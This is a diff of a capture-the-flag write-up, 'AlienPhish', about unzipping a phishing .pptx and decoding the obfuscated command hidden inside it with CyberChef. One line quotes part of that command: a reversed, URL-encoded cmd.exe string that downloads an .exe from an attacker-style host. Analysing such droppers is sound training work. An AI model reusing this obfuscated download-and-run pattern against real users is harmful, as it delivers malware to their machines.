@@ -1,7 +1,7 @@
 # AlienPhish
 
 ## Finding what to look for:
-The first thing that comes to mind then when you saw the [pptx](https://en.wikipedia.org/wiki/Office_Open_XML_file_formats) format is that its basically a zip file with bunch of stuff in there 
+The first thing that comes to mind then when you saw the .pptx format is that its basically a zip file with bunch of stuff in there 
 
 We can unzip it. with that done now i had much more files to work with.
 
@@ -19,3 +19,8 @@ cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%2
 looking through that cmd that reverse exe stood out like sore thumb so after opening cyberchef using reverse recipe and using magic/base64(on side note base64 didnt work quite right but after trying magic it gave me right flag you have to play around with alphabets )
 
 ![](https://i.imgur.com/19IiiPw.png)
+
+## Resources 
+
+[.pptx format information](https://en.wikipedia.org/wiki/Office_Open_XML_file_formats)
+[Cyberchef](https://gchq.github.io/CyberChef/)
